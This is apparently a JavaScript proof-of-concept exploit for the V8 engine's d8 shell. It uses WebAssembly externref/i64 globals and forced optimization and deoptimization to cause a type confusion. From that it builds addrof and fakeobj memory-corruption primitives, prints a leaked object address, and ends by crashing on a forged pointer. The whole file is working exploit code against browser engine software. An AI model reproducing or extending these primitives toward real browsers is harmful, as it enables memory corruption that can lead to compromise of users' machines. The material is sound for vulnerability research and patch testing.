d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

function makeInstance(callback) {
  const builder = new WasmModuleBuilder();
  const callback_index = builder.addImport('env', 'callback', kSig_v_v);

  const g_ref = builder.addGlobal(kWasmExternRef, true, false).exportAs('g_ref');
  const g_i64 = builder.addGlobal(kWasmI64, true, false).exportAs('g_i64');

  builder.addFunction('rr', kSig_r_v)
      .addBody([
        kExprCallFunction, callback_index,
        kExprGlobalGet, g_ref.index,
      ])
      .exportFunc();

  builder.addFunction('rl', kSig_l_v)
      .addBody([
        kExprCallFunction, callback_index,
        kExprGlobalGet, g_i64.index,
      ])
      .exportFunc();

  return builder.instantiate({env: {callback}}).exports;
}

function addrof(target) {
  let arm_deopt = false;

  function LeakI64() {}
  function LeakRef() {}

  const exports_ = makeInstance(() => {
    if (arm_deopt) {
      LeakRef.prototype.deopt_marker = 1;
    }
  });

  Object.defineProperty(LeakI64.prototype, 'x',
                        {get: exports_.rl, configurable: true});
  Object.defineProperty(LeakRef.prototype, 'x',
                        {get: exports_.rr, configurable: true});

  function foo(o) {
    return o.x;
  }

  const a = new LeakI64();
  const b = new LeakRef();

  exports_.g_ref.value = target;
  exports_.g_i64.value = 43n;

  %PrepareFunctionForOptimization(foo);
  for (let i = 0; i < 20; ++i) {
    foo(a);
    foo(b);
  }

  %OptimizeFunctionOnNextCall(foo);
  foo(a);

  arm_deopt = true;
  return foo(b);
}

function fakeobj(addr) {
  let arm_deopt = false;

  function MaterializeRef() {}
  function MaterializeI64() {}

  const exports_ = makeInstance(() => {
    if (arm_deopt) {
      MaterializeI64.prototype.deopt_marker = 1;
    }
  });

  Object.defineProperty(MaterializeRef.prototype, 'x',
                        {get: exports_.rr, configurable: true});
  Object.defineProperty(MaterializeI64.prototype, 'x',
                        {get: exports_.rl, configurable: true});

  function foo(o) {
    return o.x;
  }

  const a = new MaterializeRef();
  const b = new MaterializeI64();

  exports_.g_ref.value = {marker: 1};
  exports_.g_i64.value = addr;

  %PrepareFunctionForOptimization(foo);
  for (let i = 0; i < 20; ++i) {
    foo(a);
    foo(b);
  }

  %OptimizeFunctionOnNextCall(foo);
  foo(a);

  arm_deopt = true;
  const result = foo(b);
  return result;
}

function hex(n) {
  return '0x' + n.toString(16).padStart(16, '0');
}

let test = { blah: 0x25788785 };
let test_addr = addrof(test);
print('[+] test addrof: ' + hex(test_addr));
print("[+] now compare with the expected value ");
%DebugPrint(test);
let fake_test = fakeobj(test_addr);
print('[+] fake_test: ' + fake_test);
for (let key in fake_test) {
  print(`[+] fake_test.${key} = ` + hex(fake_test[key]));
}

print("[+] now ready to crash");
print(fakeobj(0x41414141n));

